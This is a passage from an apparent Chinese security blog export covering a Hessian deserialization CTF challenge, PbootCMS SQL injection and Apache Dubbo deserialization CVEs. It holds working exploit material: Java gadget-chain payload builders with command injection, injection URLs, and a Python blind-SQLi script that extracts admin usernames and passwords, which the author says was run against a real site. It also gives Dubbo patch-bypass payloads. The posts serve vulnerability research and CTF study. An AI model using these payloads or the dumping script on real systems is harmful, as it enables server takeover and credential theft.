虎符ezchainhttps://firebasky.github.io/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/ 不出网 原生hession 二次反序列化遍历到getOutputProperties前报错 private transient ThreadLocal _sdom = new ThreadLocal();//transient且readObject内没有赋值 public DOM getStylesheetDOM() &#123; return (DOM)_sdom.get(); &#125; 改成Templates//只有getOutputProperties public interface Templates &#123; ToStringBean item = new ToStringBean(Templates.class, templates); package marshalsec; import com.caucho.hessian.io.Hessian2Input; import com.caucho.hessian.io.Hessian2Output; import com.rometools.rome.feed.impl.EqualsBean; import com.rometools.rome.feed.impl.ToStringBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import marshalsec.util.Reflections; import javax.xml.transform.Templates; import java.io.*; import java.security.*; import java.util.Base64; import java.util.HashMap; import static marshalsec.util.Reflections.setFieldValue; public class Hession2Double &#123; public static void main(String[] args) throws Exception &#123; byte[] code = ClassPool.getDefault().get(&quot;marshalsec.templates.EvilShell&quot;).toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;abc&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;); ToStringBean item = new ToStringBean(Templates.class, templates); // ToStringBean item = new ToStringBean(clazz, obj); ToStringBean tmp = new ToStringBean(String.class, &quot;&quot;); HashMap attachments = new HashMap(); // 本地触发calc,需要反射修改 // EqualsBean root = new EqualsBean(ToStringBean.class, item); EqualsBean root = new EqualsBean(ToStringBean.class, tmp); attachments.put(root, &quot;pwn&quot;); for (Object key : attachments.keySet()) &#123; // System.out.println(key); Reflections.setFieldValue(key, &quot;obj&quot;, item); &#125; KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(&quot;DSA&quot;); SignedObject signedObject = new SignedObject(attachments, privateKey,signingEngine); // signedObject.getObject(); // HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); ToStringBean item1 = new ToStringBean(SignedObject.class, signedObject);//hession不能恢复 _tfactory EqualsBean root1 = new EqualsBean(ToStringBean.class, tmp); HashMap attachments1 = new HashMap(); attachments1.put(root1, &quot;pwn&quot;); for (Object key : attachments1.keySet()) &#123; // System.out.println(key); Reflections.setFieldValue(key, &quot;obj&quot;, item1); &#125; ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); output.writeObject(attachments1); output.getBytesOutputStream().flush(); output.completeMessage(); output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); byte[] bytes = os.toByteArray(); ByteArrayInputStream btin = new ByteArrayInputStream(bytes); Hessian2Input input = new Hessian2Input(btin); input.readObject(); &#125; &#125; 注入handler内存马 直接命令执行hession 可以不⽤实现序列化接口 可以参考 marshalsec的实现 在 sun.print.UnixPrintService 的所有get⽅法都能触发，别看这个是Unix其实linux也 有，在⾼版本被移除(有兴趣⾃⼰考古)，利⽤⽅式就是简单命令拼接执⾏（缺点就是太能弹 了，基本上每个get⽅法都能弹） Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class); declaredConstructor.setAccessible(true); ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class, declaredConstructor.newInstance(&quot;;open -na Calculator&quot;)); ObjectBean root = new ObjectBean(ObjectBean.class, delegate); HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); // ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory(); sf.setAllowNonSerializable(true); output.setSerializerFactory(sf); output.writeObject(map); output.getBytesOutputStream().flush(); output.completeMessage(); 拿flag的话就两种⽅式 JavaAgent 注⼊内存马，或者本来就是ctf 如何快速拿利⽤链 在这次⽐赛后我简单学习了下⽤tabby，通过下⾯的neo4j查询语句，之后⼈⼯排查下 利⽤⼀： 利⽤⼆： output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); 2022网鼎杯青龙组badbeanhttps://jeva.cc/2855.html https://y4er.com/posts/wangdingbei-badbean-hessian2/ 2022 0ctf hessian onlyjdkxstream反序列化链 map.put-&gt;MultiUIDefaults(私有+map实现类 不能反序列化)替换为codeql找到的MimeTypeParameterList(toString()里有hashtable属性.get())-&gt;SwingLazyValue.createValue-&gt;任意类任意静态方法调用(不能是对象调用静态方法，反射利用可嵌套绕过) tql，，，","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"cms漏洞3","slug":"cms漏洞3","date":"2022-03-24T15:05:26.291Z","updated":"2022-03-24T15:11:09.461Z","comments":true,"path":"2022/03/24/cms漏洞3/","link":"","permalink":"https://pipimi110.github.io/2022/03/24/cms%E6%BC%8F%E6%B4%9E3/","excerpt":"","text":"cms漏洞3pbootcms后台 /admin.php 默认账号密码 admin:123456 sqlite数据库密码为 md5(md5(“123456”)) sql注入3.0.4 http://www.hackdig.com/06/hack-377510.htm &lt;= 3.0.5PbootCMS/v305/apps/home/model/ParserModel.php 参数拼接(sql sink) 注入点1http://wiki.peiqi.tech/wiki/cms/PbootCMS/PbootCMS%20domain%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html http://localhost:60086/PbootCMS/v304/?domain/13%27.html http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%271%27--.html http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%270%27--.html 注入点2//有的网站管理员可能删除了注入点1/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html 遇到问题 http://localhost:60086/PbootCMS/v305/?about_3%27)and(1)--.html 200 http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(&#39;qwe&#39;))--.html 执行SQL发生错误！错误：no such table: qwe http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html 执行SQL发生错误！错误：near “3”: syntax error 调试后发现是_的问题 简单分析入口 PbootCMS/v305/apps/home/controller/IndexController.php &#125; elseif ($url_rule_type == 3 &amp;&amp; isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; $qs = $_SERVER[&quot;QUERY_STRING&quot;]) &#123; // 采用简短传参模式 parse_str($qs, $output); unset($output[&#39;page&#39;]); // 去除分页 if ($output &amp;&amp; ! current($output)) &#123; // 第一个路径参数不能有值，否则非标准路径参数 $path = key($output); // 第一个参数为路径信息，注意PHP数组会自动将key点符号转换下划线 $path = trim($path, &#39;/&#39;); // 去除两端斜杠 $url_rule_suffix = substr($this-&gt;config(&#39;url_rule_suffix&#39;), 1); if (preg_match(&#39;/_&#39; . $url_rule_suffix . &#39;$/&#39;, $path) &amp;&amp; (! ! $pos = strripos($path, &#39;_&#39; . $url_rule_suffix))) &#123; $path = substr($path, 0, $pos); // 去扩展 &#125; $path = explode(&#39;/&#39;, $path); &#125; &#125;... if (isset($path) &amp;&amp; is_array($path)) &#123; // 地址分隔符 $url_break_char = $this-&gt;config(&#39;url_break_char&#39;) ?: &#39;_&#39;; // 判断第一个参数中组合信息 if (strpos($path[0], $url_break_char)) &#123; //$path[0]为about_3&#39;)and(select(username)from(ay_user))-- //$url_break_char为_ $param = explode($url_break_char, $path[0]); &#125; else &#123; $param[] = $path[0]; &#125; 根据 $path = explode(&#39;/&#39;, $path);//构造一个path[0]绕过 改成下面绕过 /PbootCMS/v304/?about_/3%27)and(select(username)from(ay_user))--.html 但是都变成404了，发现执行了不同的sql， if (count($path) &gt; 1) &#123;//注入点2//为了绕过_ count($path)&gt;1了 define(&#39;CMS_PAGE&#39;, false); // 使用普通分页处理模型 if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123; if ($data-&gt;acode != get_lg() &amp;&amp; Config::get(&#39;lgautosw&#39;) !== &#39;0&#39;) &#123; cookie(&#39;lg&#39;, $data-&gt;acode); // 调用内容语言与当前语言不一致时，自动切换语言 &#125; $this-&gt;getContent($data); &#125; else &#123; _404(&#39;您访问的内容不存在，请核对后重试！&#39;); &#125; &#125; else &#123;//注入点1 尝试手动修改id测试满足一下条件 if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123; 默认数据改成下面可以用 http://localhost:60086/PbootCMS/v305/?about_4/5%27)and(1)--.html 网站管理员修改后的可以爆破一下，满足条件返回200 GET /?about_§4§/§5§%27)and(1)--.html HTTP/1.1 某站扫了一下 exp pbootcms 过滤空格 实测有的站有waf #过滤from(xxx) #过滤fromxxx #过滤substr import re from threading import Thread import requests import urllib3 import string urllib3.util.url.FRAGMENT_CHARS |= &#123;&quot;|&quot;, &quot;%&quot;&#125; url = &quot;&quot; bool_flag = 200 proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125; def getres(exp): burp0_url = url+exp+&quot;.html&quot; # r = requests.get(burp0_url, proxies=proxies) r = requests.get(burp0_url) e = &quot;syntax error&quot; if e in r.text: print(r.text) exit(e) return r.status_code def makexp(c,flag): exp = &quot;&#39;)and((&#123;content&#125;)like&#39;&#123;flag&#125;%&#39;)--&quot;.format(content=c,flag=flag) return exp def run(len1, chars, c, flag): for l in range(len1): for x in chars: tmp = flag+x exp = makexp(c, tmp) print(&quot;[-]test: &quot;+x) # print(exp) # print(getres(exp)) if getres(exp) == 200: flag = tmp break # exit() print(&quot;[+]flag: &quot;+flag) if flag != tmp: exit(&quot;[-]not found|over&quot;) c = &quot;sqlite_version()&quot; #过滤sqlite_version() #过滤空格 #过滤from(xxx) #过滤from`xxx` #过滤substr c = &quot;select(group_concat(password))from&#39;ay_user&#39;&quot; c = &quot;select(group_concat(username))from&#39;ay_user&#39;&quot; chars = &quot;,&quot;+string.ascii_letters+string.digits+&quot;_&quot; len1 = 20 flag = &quot;&quot; run(len1, chars, c, flag)","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php","slug":"php","permalink":"https://pipimi110.github.io/tags/php/"}],"keywords":[{"name":"代码审计","slug":"代码审计","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"dubbo反序列化漏洞分析","slug":"dubbo漏洞","date":"2022-03-20T16:15:44.097Z","updated":"2022-04-01T11:15:08.480Z","comments":true,"path":"2022/03/21/dubbo漏洞/","link":"","permalink":"https://pipimi110.github.io/2022/03/21/dubbo%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"除了官方推荐的默认Dubbo协议外，Dubbo还支持HTTP，RMI等协议。 provider相当于服务器，是我们的攻击目标 consumer相当于客户机，不是攻击目标 安装 zookeeper 实际上 dubbo-spring-boot-samples 没有用到，不安装也可以 https://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz 解压后的根目录下新建data和logs两个文件夹，修改conf目录下的zoo_sample.cfg为zoo.cfg，覆盖原有的dataDir并添加dataLogDir dubbo-spring-boot-samples https://codeload.github.com/apache/dubbo-spring-boot-project/zip/refs/tags/2.7.5 application.yml 改端口 server: port: 8888 dubbopoc/buddo-demo https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-basic https://github.com/lz2y/DubboPOC 注意 此环境非spring-boot 没有tomcat依赖 dubbo-provider.xml &lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt; 需要安装zookeeper bin\\zkServer.cmd nc 127.0.0.1 20880 dubbo&gt;ls PROVIDER: top.lz2y.service.DemoService dubbo&gt;ls top.lz2y.service.DemoService top.lz2y.service.DemoService (as provider): sayHello CVE-2019-17564//httphttps://www.anquanke.com/post/id/231416#h3-3 2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4 2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7 Apache Dubbo = 2.5.x 在用户使用HTTP协议进行通信时，会将消费者远程的request中POST的数据进行反序列化，而且Dubbo对于消息体未做过滤等处理，所以造成了这次反序列化问题。 curl CVE-2020-1948https://www.freebuf.com/vuls/287658.html http://rui0.cn/archives/1338 https://xz.aliyun.com/t/7969#toc-2 https://www.cnblogs.com/bitterz/p/15526206.html Apache Dubbo 2.7.0 to 2.7.6 Apache Dubbo 2.6.0 to 2.6.7 Apache Dubbo all 2.5.x versions (官方已不再提供支持) 在provider-sample文件夹下的 pom 里添加 rome 依赖//和yso rome不是同一种 依赖&lt;dependency&gt; &lt;groupId&gt;com.rometools&lt;/groupId&gt; &lt;artifactId&gt;rome&lt;/artifactId&gt; &lt;version&gt;1.7.0&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; 攻击依赖于 rome 工具包中的 ToStringBean 工具 分析rome依赖 toString-&gt;jndi注入 python //dubbo2.7.3python版本poc成功触发的关键点在于，通过构造一个不存在的service_name使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞 sink1//后反序列化//除了该exp&lt;=2.7.3，其他&lt;=2.7.13 没有使用hashmap，只触发一次命令执行 DubboProtocol Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123; ... DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey); if (exporter == null) &#123; throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv); &#125;//触发inv.toString() 调用链 getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo) decodeInvocationArgument:282, CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:137, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec) decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec) decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4) decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec) callDecode:441, ByteToMessageDecoder (io.netty.handler.codec) channelRead:278, ByteToMessageDecoder (io.netty.handler.codec) invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel) invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel) fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel) channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel) invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel) invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel) fireChannelRead:930, DefaultChannelPipeline (io.netty.channel) read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio) processSelectedKey:682, NioEventLoop (io.netty.channel.nio) processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio) processSelectedKeys:534, NioEventLoop (io.netty.channel.nio) run:496, NioEventLoop (io.netty.channel.nio) run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent) run:74, ThreadExecutorMap$2 (io.netty.util.internal) run:30, FastThreadLocalRunnable (io.netty.util.concurrent) run:748, Thread (java.lang) inv = new DecodeableRpcInvocation(channel, req, is, proto); inv.decode(); 到字符串拼接 &quot;, message:&quot; + inv //inv 为 DecodeableRpcInvocation 触发StringBuilder.append @Override public StringBuilder append(Object obj) &#123; return append(String.valueOf(obj)); &#125; public static String valueOf(Object obj) &#123; return (obj == null) ? &quot;null&quot; : obj.toString(); &#125; RpcInvocation.toString() public String toString() &#123; return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;; &#125;//Arrays.toString(this.arguments) Arrays.toString public static String toString(Object[] a) &#123; ... for (int i = 0; ; i++) &#123; b.append(String.valueOf(a[i])); dubbo2.7.5https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346 补丁DubboProtocol.getInvocationWithoutData if (exporter == null) &#123; throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv)); private Invocation getInvocationWithoutData(Invocation invocation) &#123; if (this.logger.isDebugEnabled()) &#123;//开启debug 仍可触发 return invocation; &#125; else if (invocation instanceof RpcInvocation) &#123; RpcInvocation rpcInvocation = (RpcInvocation)invocation; rpcInvocation.setArguments((Object[])null);//清空防止 RpcInvocation.toString 触发 Arrays.toString(this.arguments) return rpcInvocation; &#125; else &#123; return invocation; &#125; &#125; sink1//但是attachments dubbo2.7.5 补丁只清空 arguments java exp 设置 attachments 重点关注几个 in.readxxx()，exp对应out.writexxx() public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); this.put(&quot;serialization_id&quot;, this.serializationType); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); String version = in.readUTF(); this.setAttachment(&quot;version&quot;, version); this.setMethodName(in.readUTF()); String desc = in.readUTF(); this.setParameterTypesDesc(desc); try &#123; if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123; CodecSupport.checkSerialization(path, version, this.serializationType); &#125; Object[] args = DubboCodec.EMPTY_OBJECT_ARRAY; Class&lt;?&gt;[] pts = DubboCodec.EMPTY_CLASS_ARRAY; if (desc.length() &gt; 0) &#123; //&quot;&quot;.length()=0 &#125; this.setParameterTypes(pts); Map&lt;String, Object&gt; map = in.readAttachments();//bypass3//触发hashmap的put if (map != null &amp;&amp; map.size() &gt; 0) &#123; Map&lt;String, Object&gt; attachment = this.getObjectAttachments(); if (attachment == null) &#123; attachment = new HashMap(); &#125; ((Map)attachment).putAll(map); this.setObjectAttachments((Map)attachment);//设置attachment//后续触发toString &#125; exp//bypass1可以简化//并且绕过2.7.7 out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); // out.writeUTF(&quot;Ljava/lang/Object;&quot;); // out.writeObject(&quot;sayHello1&quot;); out.writeUTF(&quot;&quot;); HashMap attachments = getJNDI1(uri);//attachments out.writeObject(attachments); 触发两次命令执行 getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo) reply:123, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo) received:155, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo) received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header) received:51, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) toString:442, RpcInvocation (org.apache.dubbo.rpc) safeToString:63, Request (org.apache.dubbo.remoting.exchange) toString:143, Request (org.apache.dubbo.remoting.exchange) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 区别点DubboCodec.decodeBody protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123; byte flag = header[2]; byte proto = (byte)(flag &amp; 31); long id = Bytes.bytes2long(header, 4); ObjectInput in; if ((flag &amp; -128) == 0) &#123; ... &#125; &#125; else &#123; Request req = new Request(id); req.setVersion(Version.getProtocolVersion()); req.setTwoWay((flag &amp; 64) != 0); if ((flag &amp; 32) != 0) &#123; req.setEvent(true); &#125; try &#123; Object data; if (req.isEvent()) &#123;//其他sink in = CodecSupport.deserialize(channel.getUrl(), is, proto); data = this.decodeEventData(channel, in); &#125; else &#123; DecodeableRpcInvocation inv; if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) &#123; inv = new DecodeableRpcInvocation(channel, req, is, proto); inv.decode();//sink1 sink2//后反序列化https://www.cnblogs.com/bitterz/p/15526206.html 在readUTF的位置writeObject(HashMap) protected IOException expect(String expect, int ch) throws IOException &#123; if (ch &lt; 0) &#123; return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;); &#125; else &#123; --this._offset; try &#123; Object obj = this.readObject(); return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;); expect:3517, Hessian2Input (com.alibaba.com.caucho.hessian.io) readString:1853, Hessian2Input (com.alibaba.com.caucho.hessian.io) readUTF:80, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) decode:112, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:748, Thread (java.lang) DecodeableRpcInvocation public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); this.setAttachment(&quot;version&quot;, in.readUTF()); this.setMethodName(in.readUTF()); String desc = in.readUTF();// public String readUTF() throws IOException &#123; return this.mH2i.readString(); &#125; public String readString() throws IOException &#123; int tag = this.read(); int ch; switch(tag) &#123; case 0: ... case 31: this._isLastChunk = true; this._chunkLength = tag - 0; this._sbuf.setLength(0); while((ch = this.parseChar()) &gt;= 0) &#123; this._sbuf.append((char)ch); &#125; return this._sbuf.toString(); case 32: ... case 127: default: throw this.expect(&quot;string&quot;, tag);//tag=72 进入sink exp out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); // out.writeObject(&quot;sayHello1&quot;);//注释两行//bypass4 触发点在bypass3前 不受2.7.7限制 HashMap attachments = getJNDI1(uri); 抛出错误，只触发一次命令执行 default: throw this.expect(&quot;string&quot;, tag); sink3//反序列化+后反序列化com.alibaba.com.caucho.hessian.io.MapDeserializer protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123; Deserializer keyDeserializer = null; Deserializer valueDeserializer = null; SerializerFactory factory = this.findSerializerFactory(in); if (keyType != null) &#123; keyDeserializer = factory.getDeserializer(keyType.getName()); &#125; if (valueType != null) &#123; valueDeserializer = factory.getDeserializer(valueType.getName()); &#125; while(!in.isEnd()) &#123; map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); &#125; exp // String path = &quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;; String path = &quot;org.apache.dubbo.samples.basic.api.DemoService&quot;; // String path = &quot;top.lz2y.service.DemoService1&quot;; // String server_ver = &quot;1.0.0&quot;; String server_ver = &quot;&quot;; // String method = &quot;any&quot;;// &lt;=2.7.6 String method = &quot;$echo&quot;;//add 2.7.7-2.7.12 out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); //todo 方法描述不需要修改，因为此处需要指定map的payload去触发 out.writeUTF(&quot;Ljava/lang/Object;&quot;); out.writeObject(&quot;any&quot;); HashMap attachments = getJNDI2(uri);//2.7.13执行5次//使用EqualsBean//正确的path可以-2次 // HashMap attachments = getJNDI1(uri);//attachments//2.7.13执行3次 out.writeObject(attachments); 三次命令执行 反序列化 getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:339, HashMap (java.util) put:612, HashMap (java.util) doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io) readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io) readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize) decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 反序列化 getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:339, HashMap (java.util) putMapEntries:515, HashMap (java.util) putAll:785, HashMap (java.util) decode:171, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 后反序列化 getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) toString:236, Object (java.lang) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) toString:557, AbstractMap (java.util) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) toString:443, RpcInvocation (org.apache.dubbo.rpc) safeToString:63, Request (org.apache.dubbo.remoting.exchange) toString:143, Request (org.apache.dubbo.remoting.exchange) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 